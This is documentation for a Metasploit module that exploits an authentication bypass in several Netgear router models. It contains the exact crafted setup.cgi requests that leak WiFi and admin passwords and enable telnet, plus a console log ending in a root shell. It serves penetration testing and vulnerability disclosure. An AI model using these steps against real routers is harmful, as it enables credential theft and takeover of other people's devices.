## Vulnerable Application

### Intro
This module targets an authentication bypass vulnerability in the `mini_http` binary of several Netgear Routers
running firmware versions prior to `1.2.0.88`, `1.0.1.80`, `1.1.0.110`, and `1.1.0.84`.

Specifically, a call to `strstr()` is used to check if any incoming requests to authenticated pages contain
the string `todo=PNPX_GetShareFolderList` anywhere within the request. If this string is found anywhere within
the request, the request will be marked as an authenticated request, and will be treated as though it came from
a logged in administrative user.

By using this vulnerability to send a request to `/setup.cgi` with the `next_file` GET parameter set to `BRS_swisscom_success.html`
and a `x` GET parameter set to `todo=PNPX_GetShareFolderList`, an unauthenticated attacker can leak the plaintext versions of
all of the router's WiFi passwords, as well as the admin username and plaintext admin password for the router.

Once the password has been been obtained, the exploit enables telnet on the target router by sending a request to `setup.cgi`
with the `todo` GET parameter set to `debug`. Once telnet has been enabled, it then utilizes the
`auxiliary/scanner/telnet/telnet_login` module to log into the router using the stolen credentials of the
`admin` user. This will result in the attacker obtaining a new telnet session as the `root` user.

This vulnerability was discovered and exploited by an independent security researcher who reported it to SSD.

### Affected Versions

- AC2100 prior to firmware version 1.2.0.88
- AC2400 prior to firmware version 1.2.0.88
- AC2600 prior to firmware version 1.2.0.88
- D7000 prior to firmware version 1.0.1.80
- R6220 prior to firmware version 1.1.0.110
- R6230 prior to firmware version 1.1.0.110
- R6260 prior to firmware version 1.1.0.84
- R6330 prior to firmware version 1.1.0.84
- R6350 prior to firmware version 1.1.0.84
- R6700v2 prior to firmware version 1.2.0.88
- R6800 prior to firmware version 1.2.0.88
- R6850 prior to firmware version 1.1.0.84
- R6900v2 prior to firmware version 1.2.0.88
- R7200 prior to firmware version 1.2.0.88
- R7350 prior to firmware version 1.2.0.88
- R7400 prior to firmware version 1.2.0.88
- R7450 prior to firmware version 1.2.0.88

## Verification Steps

  1. Start msfconsole
  2. Do: `use auxiliary/admin/http/netgear_pnpx_getsharefolderlist_auth_bypass`
  3. Do: `set RHOSTS <RouterIP>`
  5. Do: `exploit`
  6. Verify that you get a new telnet shell as the `root` user on the target router.

## Options

## Scenarios

### Netgear AC1600 aka R6260 with Firmware Version 1.1.0.40_1.0.1
```
        msf6 > use auxiliary/admin/http/netgear_pnpx_getsharefolderlist_auth_bypass
        msf6 auxiliary(admin/http/netgear_pnpx_getsharefolderlist_auth_bypass) > show options

        Module options (auxiliary/admin/http/netgear_pnpx_getsharefolderlist_auth_bypass):

        Name     Current Setting  Required  Description
        ----     ---------------  --------  -----------
        Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
        RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metaspl
                                        oit
        RPORT    80               yes       The target port (TCP)
        SSL      false            no        Negotiate SSL/TLS for outgoing connections
        VHOST                     no        HTTP server virtual host

        msf6 auxiliary(admin/http/netgear_pnpx_getsharefolderlist_auth_bypass) > set RHOSTS 192.168.1.1
        RHOSTS => 192.168.1.1
        msf6 auxiliary(admin/http/netgear_pnpx_getsharefolderlist_auth_bypass) > check

        [*] Target is a R6260 router running firmware version 1.1.0.40_1.0.1
        [*] 192.168.1.1:80 - The target appears to be vulnerable.
        msf6 auxiliary(admin/http/netgear_pnpx_getsharefolderlist_auth_bypass) > exploit
        [*] Running module against 192.168.1.1

        [*] Running automatic check ("set AutoCheck false" to disable)
        [*] Target is a R6260 router running firmware version 1.1.0.40_1.0.1
        [+] The target appears to be vulnerable.
        [*] Attempting to leak the password of the admin user...
        [+] Can log into target router using username admin and password theRiverOfNope123!
        [*] Attempting to retrieve /top.html to verify we are logged in!
        [*] Sending one request to grab authorization cookie from headers...
        [*] Got the authentication cookie, associating it with a logged in session...
        [+] Successfully logged into target router using the stolen credentials!
        [*] Attempting to store the stolen admin credentials for future use...
        [*] Enabling telnet on the target router...
        [+] Telnet enabled on target router!
        [*] Attempting to log in with admin:theRiverOfNope123!. You should get a new telnet session as the root user
        [*] Command shell session 1 opened (192.168.224.128:45717 -> 192.168.1.1:23) at 2021-09-23 16:38:53 -0500
        [*] Auxiliary module execution completed
        msf6 auxiliary(admin/http/netgear_pnpx_getsharefolderlist_auth_bypass) > sessions -i 1
        [*] Starting interaction with 1...



        # uname -a
        uname -a
        Linux R6260 2.6.36 #7 SMP Fri Jul 20 17:14:50 CST 2018 mips unknown

        # busybox
        busybox
        BusyBox v1.12.1 (2018-07-18 20:59:15 CST) multi-call binary
        Copyright (C) 1998-2008 Erik Andersen, Rob Landley, Denys Vlasenko
        and others. Licensed under GPLv2.
        See source distribution for full notice.

        Usage: busybox [function] [arguments]...
        or: function [arguments]...

                BusyBox is a multi-call binary that combines many common Unix
                utilities into a single executable.  Most people will create a
                link to busybox for each function they wish to use and BusyBox
                will act like whatever it was invoked as!

        Currently defined functions:
                [, [[, arp, ash, awk, basename, bunzip2, bzcat, cat, chmod, chpasswd,
                cp, cut, date, dd, df, dmesg, echo, expr, false, fdisk, find, free,
                ftpget, grep, gzip, halt, head, hexdump, hostname, ifconfig, init,
                init, insmod, kill, killall, ln, login, ls, lsmod, md5sum, mdev,
                mkdir, mknod, more, mount, mv, netstat, nice, passwd, pidof, ping,
                ping6, poweroff, ps, pwd, reboot, renice, rm, rmmod, route, sed,
                seq, sh, sleep, sync, tail, tar, taskset, telnetd, test, tftp,
                time, top, touch, tr, traceroute, true, umount, uname, unzip, vconfig,
                vi, wc, wget

        #
```
